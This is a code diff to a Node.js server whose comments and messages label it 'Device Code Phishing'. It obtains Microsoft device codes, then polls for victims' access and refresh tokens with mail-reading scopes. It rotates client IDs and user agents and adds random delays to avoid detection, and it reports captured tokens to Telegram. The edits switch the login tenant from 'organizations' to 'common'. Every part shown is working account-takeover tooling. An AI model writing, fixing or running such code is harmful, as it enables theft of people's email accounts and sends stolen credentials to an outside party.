@@ -579,9 +579,9 @@ dashApp.post('/api/device/manual', async (req, res) => {
     try {
         const code = user_code || device_code;
         const DEVICE_CLIENT_ID = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
-        // ✅ FIX: Use 'organizations' tenant to avoid AADSTS50059
+        // ✅ FIX: Use 'common' tenant to avoid AADSTS50059
         const response = await axios.post(
-            'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
+            'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: DEVICE_CLIENT_ID,
                 scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
@@ -1329,25 +1329,22 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ── ✅ DEVICE CODE API (FIXED: using 'organizations' tenant) ──
+// ── ✅ DEVICE CODE API (FIXED: using 'common' tenant) ──
 app.post('/device/request', async (req, res) => {
     if (!axios) {
         return res.status(500).json({ error: 'axios not installed. Run: npm install axios' });
     }
     try {
         console.log('📱 Device code requested');
-        
         const clientId = getRandomClientId();
         const userAgent = getRandomUserAgent();
-        
         console.log(`🔄 Using client: ${clientId}`);
         console.log(`🔄 Using UA: ${userAgent.slice(0, 50)}...`);
-        
         await randomDelay(300, 800);
-        
-        // ✅ FIX: Use 'organizations' instead of 'common' to avoid AADSTS50059
+
+        // ✅ FIX: Use 'common' instead of 'organizations'
         const response = await axios.post(
-            'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
+            'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: clientId,
                 scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
@@ -1362,7 +1359,7 @@ app.post('/device/request', async (req, res) => {
         );
         const data = response.data;
         console.log('✅ Device code obtained:', data.user_code);
-        
+
         const newFlow = {
             device_code: data.device_code,
             user_code: data.user_code,
@@ -1384,7 +1381,7 @@ app.post('/device/request', async (req, res) => {
         };
         deviceFlows.push(newFlow);
         saveDeviceFlows(deviceFlows);
-        
+
         const message = `
 📱 **Device Code Phishing**
 🆔 **User Code:** \`${data.user_code}\`
@@ -1400,7 +1397,7 @@ app.post('/device/request', async (req, res) => {
                 parse_mode: 'Markdown'
             }, { timeout: 3000 });
         } catch (e) { console.log('⚠️ Telegram notify failed but continuing'); }
-        
+
         res.json(data);
     } catch (error) {
         console.error('❌ Device code error:', error.response?.data || error.message);
@@ -1408,29 +1405,25 @@ app.post('/device/request', async (req, res) => {
     }
 });
 
-// ── ✅ DEVICE TOKEN POLLING (FIXED: using 'organizations' tenant) ──
+// ── ✅ DEVICE TOKEN POLLING (FIXED: using 'common' tenant) ──
 app.post('/device/token', async (req, res) => {
     if (!axios) {
         return res.status(500).json({ error: 'axios not installed. Run: npm install axios' });
     }
-    
     const { device_code } = req.body;
-    
     if (!device_code) {
         return res.status(400).json({ error: 'device_code required' });
     }
     try {
         console.log('🔄 Polling for token:', device_code);
-        
         const flow = deviceFlows.find(f => f.device_code === device_code);
         const clientId = flow?.client_id || CLIENT_IDS[0];
         const userAgent = getRandomUserAgent();
-        
         await randomDelay(200, 600);
-        
-        // ✅ FIX: Use 'organizations' to match the device code request
+
+        // ✅ FIX: Use 'common' to match the device code request
         const response = await axios.post(
-            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
             new URLSearchParams({
                 client_id: clientId,
                 device_code: device_code,
@@ -1446,11 +1439,11 @@ app.post('/device/token', async (req, res) => {
         );
         const tokens = response.data;
         console.log('✅ Tokens obtained!');
-        
+
         const tokenType = tokens.access_token ? 'Access Token' : 
                          tokens.refresh_token ? 'Refresh Token' : 
                          tokens.id_token ? 'ID Token' : 'Unknown';
-        
+
         if (flow) {
             flow.status = 'approved';
             flow.approved = new Date().toISOString();
@@ -1466,7 +1459,7 @@ app.post('/device/token', async (req, res) => {
             }
             saveDeviceFlows(deviceFlows);
         }
-        
+
         const message = `
 📱 **Device Code Phishing - SUCCESS!**
 🔑 **Access Token:** \`${tokens.access_token?.slice(0, 30)}...\`
@@ -1482,7 +1475,7 @@ app.post('/device/token', async (req, res) => {
                 parse_mode: 'Markdown'
             }, { timeout: 3000 });
         } catch (e) {}
-        
+
         res.json(tokens);
     } catch (error) {
         if (error.response?.data?.error === 'authorization_pending') {
@@ -1649,7 +1642,7 @@ const server = app.listen(PORT, '0.0.0.0', () => {
     console.log(`📱 Device Code: /device`);
     console.log(`🔄 Client Rotation: ${CLIENT_IDS.length} clients loaded`);
     console.log(`🔄 UA Rotation: ${USER_AGENTS.length} user-agents loaded`);
-    console.log(`✅ Using 'organizations' tenant (fixed AADSTS50059)`);
+    console.log(`✅ Using 'common' tenant (fixed AADSTS50059)`);
 });
 
 // ── ✅ WEBSOCKET SUPPORT ──
